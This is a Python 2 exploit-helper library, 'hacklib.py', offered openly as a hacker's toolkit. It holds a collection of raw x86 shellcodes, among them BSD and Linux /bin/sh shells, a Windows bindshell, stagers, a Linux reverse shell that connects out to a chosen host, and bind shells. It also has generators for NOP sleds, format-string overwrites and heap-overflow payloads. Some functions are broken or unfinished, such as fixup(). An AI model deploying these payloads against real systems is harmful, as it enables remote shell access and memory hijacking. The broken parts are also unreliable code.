#!/usr/bin/python
#	Version 2.0
#
#  hacklib.py makes available various helper subs for the hacking process.  'import hacklib'
#
#	xw(String)	- takes in a 4-byte string parameter(with/wo "0x"), returns little-endian DWORD
#				xw("0x080489af")
#	genShell(#,#[,#])	- Takes in which shell, overall size, and size of front NOP sled.
#	
#	genformatstring('0xoverwrittenaddress', '0xshellcodeaddress' [, offset])
#			- creates a format string which will overwrite the first address location with the second address
#				offset allows you to adjust where the address is located due to prepended bytes (as in --inline)
#					or differences in printf
#
#  I cannot stress enough that this is a helper library for use with specific hacking tasks.  It is not intended to 
# compete with nor replace the Metasploit framework.  The msf team has worked hard to build a *very* powerful framework
# for writing exploits which is unrivaled.  The hacklib is simply a tool to help the hacker/reverse engineer keep themselves
# very close to the commandline.  Consider it part of my b@-utility belt which I'm sharing with you.  Improvements are 
# welcome, destructive criticism is worthless.  I have no illusion of it being very great.
# @


import struct
import sys
import random
import socket

SHELLS = {}
NETBIND = {}

DEFAULT_NOPS = "ABCFGHKIJ@'"

PIVOTBYTES_x86 = ( '\x87\xc4', '\x87\xcc', '\x87\xd4', '\x87\xdc', '\x87\xe0', '\x87\xe1', '\x87\xe2', '\x87\xe3', '\x87\xe5', '\x87\xe6', '\x87\xe7', '\x87\xec', '\x87\xf4', '\x87\xfc', )

#bsd shell of unknown origin...
SHELLS['bsd-unknown'] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

#bsd shell of unknown origin...
SHELLS['bsd-unknown2'] = "\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c\x89\x76\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff\xff\xff\xff\x07\xff\xe8\xdc\xff\xff\xff/bin/sh\x00"


#from http://shellcode.org/Shellcode/BSD/bsd-shellcode.html
SHELLS['bsd-shellcode.org'] = "\x31\xc0\x50\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcc\x80"


#from $ebp forward (my own)  used for dc13 prequals stage 7
SHELLS['bsd-ebp-forward']="\xc7\x45\x24" + "\x90\x90\x31\xc0" + "\xc7\x45\x28" + "\x50\x50\x50\xb0" + "\xc7\x45\x2c" + "\x17\xcc\x80\x31" + "\xc7\x45\x30" + "\xc0\x50\x68\x2f" + "\xc7\x45\x34" + "\x2f\x73\x68\x68" + "\xc7\x45\x38" + "\x2f\x62\x69\x6e" + "\xc7\x45\x3c" + "\x89\xe3\x50\x54" + "\xc7\x45\x40" + "\x53\x50\xb0\x3b" + "\xc7\x45\x44" + "\xcc\x80\x31\xc0" + "\xc7\x45\x48" + "\xb0\x01\xcc\x80" + "\xfe\x45\x44" + "\xfe\x45\x4a" + "\xfe\x45\x2d" + "\x8d\x55\x24" + "\xff\xe2"

# Inplace editing using jmp/call/pop method!
SHELLS['bsd-jmpcallpop'] = "\xeb\x30\x5b" + "\xfe\x43\xf9\xfe\x43\xf3\xfe\x43\xdc" + "\x31\xc0\x50\x50\x50\xb0\x17\xcc\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcc\x80\x31\xc0\xb0\x01\xcc\x80" + "\xe8\xcb\xff\xff\xff"

SHELLS['bsd-findtag-stager'] = "\x31\xd2\x52\x89\xe6\x52\x52\xb2\x80\x52\xb6\x0c\x52\x56\x52"+"\x52\x66\xff\x46\xe8\x6a\x1d\x58\xcd\x80\x81\x3e\x48\x45\x62"+"\x44\x75\xef\xfc\xad\x5a\x5f\x5a\xff\xe6"
SHELLS['bsd-findtag-shell'] = struct.pack("L",0x44624548) + "\x31\xc0\x50\x50\xb0\x7e\x50\xcd\x80\x6a\x02\x59\x6a\x5a\x58"+"\x51\x57\x51\xcd\x80\x49\x79\xf5\x6a\x3b\x58\x99\x52\x68\x2f"+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x54\x53\x53\xcd"+"\x80"

#SHELLS['bsd-findtag-shell'] = "\x31\xc0\x50\x50\xb0\x7e\x50\xcd\x80\x6a\x02\x59\x6a\x5a\x58"+"\x51\x57\x51\xcd\x80\x49\x79\xf5\x6a\x3b\x58\x99\x52\x68\x2f"+"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x54\x53\x53\xcd"+"\x80"

SHELLS['lin-findtag-stager'] = "\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86"+"\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x52\x59\x4a\x51"+"\x75\xf0\x5f\xfc\xad\xff\xe6"
SHELLS['lin-findtag-shell'] = struct.pack("L",0x514a5952) + "\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b"+"\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"+"\x52\x53\x89\xe1\xcd\x80"

def checkBytes(string, avoidbytes):
    for c in string:
        if c in avoidbytes:
            return False
    return True

incbytes = '\xfe\x43'
def fixup(shellcode, avoidbytes = "\x00\x0a",  MAXBUFFER=100):
    problems = []
    for b in range(len(shellcode)):
        if shellcode[b] in avoidbytes:
            problems.append(b)
    sizeperfixup = 3
    span = len(shellcode) + sizeperfixup * len(problems) # bytes between jmp-call-bounce

    # check if negative offset bytes for any of the problem bytes will trigger the avoidbytes
    good = False
    buffersize = 0
    while not good and buffer < MAXBUFFER:
        fixes = []
        good = True
        for prob in problems:
            fix = "%c"%(span-prob)  # negative index from end of shellcode backward
            if fix in avoidbytes:
                good = False
                buffer += 1
                span += 1
                break
            else:
                fixes.append((prob,fix)) # offset-byte and index from front 
                
    # Check the inc and dec methods...  FIXME: above checking assumes offset-based fixes...  only inc/dec?  can we xor without guargantuan encoders?  Or do we can that and just use a completely different approach like shikata-ganai or other xor-key approach?
    bufbyte = 1
    while "%c"%bufbyte in avoidbytes:
        bufbyte += 1
    prepend = ["\xeb", struct.pack("<B", span), '\x5b']    # jmp <span>; pop ebx
    append  = [bufbyte*buffer, "\xe8", struct.pack("<L", -5-span)]
    
    for prob,fix in fixes:
        # Check if inc or dec will work...
        problemchild = shellcode[span-fix]
        proposal = "%c"%(ord(problemchild)+1)
        if not proposal in avoidbytes:
            useincoffset = "FIXME: apparently i never finished this and i don't have time to now.... crap."
            
            offsetbyte, = (struct.pack("<B", span-fix))
            # is the fix as bad as the problem?
            if offsetbyte not in avoidbytes:
                prepend.append(incbytes)
                prepend.append(offsetbytes)
        

    
#  23:   c7 44 24 04 c3 c9 80    movl   $0xcc80c9c3,0x4(%esp)
#  2a:   cc
#  2b:   fe 44 24 04             incb   0x4(%esp)
#  2f:   ff 54 24 04             call   *0x4(%esp)
#  33:   ff 64 24 04             jmp    *0x4(%esp)
#  37:   c7 44 24 fc c3 c9 80    movl   $0xcc80c9c3,0xfffffffc(%esp)
#  3e:   cc
#  3f:   8d 54 24 fc             lea    0xfffffffc(%esp),%edx
#  43:   fe 44 24 fc             incb   0xfffffffc(%esp)


# port 4444 bindshell
SHELLS['win32-dcom'] = \
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"\
    "\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"\
    "\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"\
    "\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"\
    "\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"\
    "\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"\
    "\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"\
    "\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"\
    "\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81"\
    "\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"\
    "\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"\
    "\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"\
    "\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"\
    "\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"\
    "\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"\
    "\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"\
    "\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"\
    "\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3"\
    "\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"\
    "\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"\
    "\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"\
    "\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"\
    "\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"\
    "\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"\
    "\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"\
    "\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"\
    "\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"\
    "\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"\
    "\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"\
    "\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"\
    "\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"\
    "\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"\
    "\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04"





######################### END OF SHELL DEFINITIONS #########################



################################### ShellCode ##################################################################

def genNOP(size, NOPS = None):
  """  genNOP is used to create an arbitrary length NOP sled using characters of your choosing.
  Perhaps you prefer \x90, perhaps you like the defaults.  Given a list of NOP characters, 
  genNOP will randomize and spit out something not easily recognized by the average human/rev engineer.
  Still, while you are working a vulnerability, you may prefer to specify one byte such as "A" or 
  "\x90" as they are easily identified while searching memory.
	Defaults:
        # inc eax       @       \x40
        # inc ecx       A       \x41
        # inc edx       B       \x42
        # inc ebx       C       \x43
        # inc esp       D       \x44
        # inc ebp       E       \x45
        # inc esi       F       \x46
        # inc edi       G       \x47
        # dec eax       H       \x48
        # dec esx       J       \x4a
        # daa           '       \x27
        # das           /       \x2f
        # nop                   \x90
        # xor eax,eax           \x33\xc0
  """
  if (not NOPS):    NOPS = DEFAULT_NOPS
  
  sled = ""
  for i in range(size,0,-1):
    N = random.randint(0,len(NOPS)-1)
#    print("" + str(N) +  " + " +NOPS)
    sled += NOPS[N]
  return sled

def genShellbyarray(argv):
  """  genShellbyarray is simply a convenience method for use by genShell.py """
  argv.append("0")
  argv.append("0")
  
  return genShell(argv[1],int(argv[2]),int(argv[3]))

def genShell(shellname, size=-1, front=0, PREFIX="", NOPS=None) :
  """  genShell spits out a properly sized shell of your choosing.
  genShell takes three parameters:
      shellname    specifies the name of the shellcode as named in the SHELLS hash
      size         specifies the overall desired size with NOPs
      front        specifies how many of the NOPs should be in the beginning of the resulting shellcode (>0)

  If left unspecified, the selected shell is padded with a 30byte NOP sled, all in the front.
  """
  shell = PREFIX + SHELLS.get(shellname)

  diff = size - len(shell) 
  if (size == -1): diff = 30
  elif (size == 0): diff = 0
  if (diff < 0):  print >>sys.stderr,  "Too Small! Size=" + repr(len(shell)); sys.exit(1)

  if (front == 0) :
    front = diff
    rear = 0

##### "-" means the third parameter determines the size of NOPs *after* the shellcode
  elif (front < 0):
    front = diff + front
    rear = diff - front

##### otherwise, the third parameter determines the size of the NOPs *before* the shellcode
  else :
    rear = diff - front
    if ((front + rear) > diff):  print >>sys.stderr, "WRONG!! Size=" + repr(len(shell)) + " and front and rear are too big!"; sys.exit(1) 
    if ((rear <0)):          print >>sys.stderr, "WRONG!! Size=" + repr(len(shell)) + " and front is too big to go on the front!"; sys.exit(1)
    if ((front <0)):         print >>sys,stderr, "WRONG!! Size=" + repr(len(shell)) + " and rear is too big to tag on the end!"; sys.exit(1)

  SHELLCODE = genNOP(front, NOPS) + shell + genNOP(rear, NOPS)

  return(SHELLCODE)


def genShellobscure():
  SHELLCODE = "".join([ "\x90" for x in range(0,30)]) + "\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c\x89\x76\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff\xff\xff\xff\x07\xff\xe8\xdc\xff\xff\xff/bin/sh\x00"

  return(SHELLCODE)



def hex_reverse(input):
  """  hex_reverse takes an 4-byte (8 character) hex number, makes it little-endian and returns the 4-byte binary representation
  """
  output = ""
 
  inputstring = "%08x"  % input

  if (inputstring[1] == "x") :
    input = inputstring[2:] 

  b1 = inputstring[0:2]
  b2 = inputstring[2:4]
  b3 = inputstring[4:6]
  b4 = inputstring[6:8]

  print >> sys.stderr, 'Reversed Hex: %02s%02s%02s%02s' % ((b4), (b3), (b2), (b1)) 
  return struct.pack('<L', (input))


######################## Format Strings #######################################################################################################
def format_string(address, startoffset=16, ptroffset=4):
  """  format_string takes in an address, chops it up, and generates format-string code to appropriate lengths for a format string exception
  It is intended to be called by genformatstring()
      offset = how many bytes are in the shellcode inserted in the middle of the FSE
      ptroffset = special offset for strings which are not perfectly clean... (formerly 'stringoffset' which was too ambiguous)
                     this can be used for special manipulation of which 32bit chunks are used...(think Mangle)
                     Think of this as an offset to get to the address in memory (%#$n offset)

  """

  output = ""
  saddress = "%08x" % address
  decimal = 0
  if (saddress[0:2] == "0x") :
    saddress = saddress[2:]

  h1 = (address >> 24)
  h2 = (address >> 16) & 0xff
  h3 = (address >> 8)  & 0xff
  h4 = (address)       & 0xff
 
  decimal = h4 - startoffset
  while (decimal < 8):
    decimal +=256
 
  output +=  "%" +repr(decimal)+"x%"+ repr(ptroffset) + '$n'

  decimal = h3-h4
  while (decimal < 8):
    decimal +=256
 
  output +=  "%" +repr(decimal)+"x%"+ repr(1+ptroffset) + '$n'

  decimal = h2-h3
  while (decimal < 8):
    decimal +=256
 
  output +=  "%" +repr(decimal)+"x%"+ repr(2+ptroffset) + '$n'

  decimal = h1-h2
  while (decimal < 8):
    decimal +=256
 
  output +=  "%" +repr(decimal)+"x%"+ repr(3+ptroffset) + '$n'

  return output


def genformatstring(overwriteaddress = 1, withaddress=0x41414141, ptroffset=4, prefix=[], inline=False):
  """  genformatstring accepts two addresses, a prefix string, and a flag to indicate there is a prefix in stdin
  The first address is the address to be overwritten
  The second address is the address to place at the location to be overwritten
  prefix is an array of strings to be prepended to the format string for whatever purpose
  If inline == true, a prefix is read in from stdin (as in the prefix was piped to this process)
	Note:  different printf's (printf, sprintf, vprintf, fprintf, etc...) use different internal structures, and 
		which numbers (%4$n, etc...) are used differ between them.  You can use "offset" to alter the behavior
		printf()	- %4$n	- default offset is good
		sprintf()	- %2$n  - use (-2) for offset
  """

  output = ""

  if (inline) :
    prefix = sys.stdin.read()
  
  if (type(overwriteaddress) == str):	overwriteaddress = int(overwriteaddress,16)
  if (type(withaddress) == str):     	withaddress = int(withaddress,16)

  print >>sys.stderr, "Format String to overwrite the four bytes at %08x with %08x" % (overwriteaddress, withaddress)
  print >>sys.stderr, "Four memory locations of interest:"

  output += (hex_reverse(overwriteaddress))
  output += (hex_reverse(overwriteaddress+1))
  output += (hex_reverse(overwriteaddress+2))
  output += (hex_reverse(overwriteaddress+3))
  if (prefix):
      output += prefix
  output += (format_string(withaddress, len(output), ptroffset))
  return output



def genHeapOF(bufsize, overwritewith, overwritewhere, string = "", addrsize = 4):
    what=overwritewith
    where=overwritewhere
    """ not tested thoroughly yet """
    if not isinstance(what, str):
        what = struct.pack('L', what-8)
    if not isinstance(where, str):
        where = struct.pack('L', where)
    fillspace = bufsize - (2*addrsize)
    padspace = 8 - ((bufsize + 4) %8) - (addrsize)
    strlen = len(string)
    if strlen > fillspace:
        print >>stderr, ("ERROR:  string must be < %d characters in length"%fillspace)
        exit(1)
    hof = what + where + "B"*fillspace + '\xfc\xff\xff\xff' + "D"*padspace + '\xfc\xff\xff\xff' + what + where
    return hof

def xw(address):
  """  xw takes in an address and reverses it and returns little-endian..  It was inspired by gdb's x/32xw
  Don't ask me why I developed both hex_reverse *and* xw.  I must have been asleep at the time.  Actually, hex_reverse was born 
  out of the genformatstring.pl tool and xw was born from the hack.pl library.  When they were combined, it was overlooked that
  they did the same thing.  When converting to Python, I still apparently missed this fact.
  """

  ret = ""

  if (type(address) != str):
    address = hex(address) 

  print >>sys.stderr, "xw(" + address + ")"

  if (address[1] == "x"): address = address[2:]
  if (address[0] == "x"): address = address[1:]

  if (len(address) % 2 == 1): address = "0"+address
 
  for i in range(len(address),0,-2):
    byte = address[ i-2: i]
    print(byte)
    ret += chr(int(byte,16))
  
  return ret


def getPackedIP(addr):
	pckdaddr = ""
	last = 0
	loc = addr.find(".")
	if (loc > -1):
		while (loc > -1):
			pckdaddr += chr(int(addr[last:loc]))
			last = loc+1
			loc = addr.find(".",last)
		pckdaddr += chr(int(addr[last:]))
	return pckdaddr[::-1]

def BSDnetShell(port):
        port_bin = struct.pack('H', port)[::-1]

        shellcode = "\x6a\x61\x58\x99\x52\x68\x10\x02" + port_bin +"\x89\xe1\x52\x42\x52\x42" + "\x52\x6a\x10\xcd\x80\x99\x93\x51\x53\x52\x6a\x68\x58\xcd\x80\xb0" + "\x6a\xcd\x80\x52\x53\x52\xb0\x1e\xcd\x80\x97\x6a\x02\x59\x6a\x5a" + "\x58\x51\x57\x51\xcd\x80\x49\x79\xf5\x50\x68\x2f\x2f\x73\x68\x68" + "\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80"

        return(shellcode)


def BSDnetShell2(port) :
        port_bin = struct.pack('H', port)[::-1]

        shellcode ="\x6a\x61\x58\x99\x52\x68\x10\x02" + port_bin + "\x89\xe1\x52\x42\x52\x42" + "\x52\x6a\x10\xcd\x80\x99\x93\x51\x53\x52\x6a\x68\x58\xcd\x80\xb0" + "\x6a\xcd\x80\x52\x53\x52\xb0\x1e\xcd\x80\x97\x6a\x02\x59\x6a\x5a" + "\x58\x51\x57\x51\xcd\x80\x49\x79\xf5\x50\x68\x2f\x2f\x73\x68\x68" + "\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80"

        return(shellcode)


def LINrevShell(host, port):
        off_host = 0x1a
        off_port = 0x20

        host_bin = getPackedIP(socket.gethostbyname(host))[::-1]
        port_bin = struct.pack('H', port)[::-1]

        shellcode =\
                "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59" +\
                "\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\x7f\x01\x01\x01\x66\x68" +\
                "\xbf\xbf\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd" +\
                "\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" +\
                "\x89\xe1\xb0\x0b\xcd\x80"
	
	shellcode = shellcode[:off_host] + host_bin + shellcode[off_host+4:]
	shellcode = shellcode[:off_port] + port_bin + shellcode[off_port+2:]


        return(shellcode)
def LINbindShell(port=47145):
        off_port = 0x14

        port_bin = struct.pack('H', port)[::-1]

        shellcode =\
                "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96" +\
                "\x43\x52\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56" +\
                "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1" +\
                "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0" +\
                "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" +\
                "\x89\xe1\xcd\x80"


	shellcode = shellcode[:off_port] + port_bin + shellcode[off_port+2:]

        return(shellcode);

def LINfindSock():
	"""linux_ia32_findsock -  CPORT=47145 Size=62 Encoder=None http://metasploit.com """
	return \
	"\x31\xd2\x52\x89\xe5\x6a\x07\x5b\x6a\x10\x54\x55\x52\x89\xe1\xff" +\
	"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7d\x02\xb8\x29\x75\xf1\x5b\x6a" +\
	"\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68" +\
	"\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

# Network Bind
shell = BSDnetShell(47145) 
SHELLS.setdefault('bsd-netshell', shell)

shell = BSDnetShell2(47145)
SHELLS.setdefault('bsd-netshell2', shell)

shell = LINrevShell("127.1.1.1",47145)
SHELLS.setdefault('lin-reverse-shell', shell)

shell = LINbindShell(47145)
SHELLS.setdefault('lin-bind-shell', shell)

shell = LINfindSock()
SHELLS.setdefault('lin-find-sock', shell)

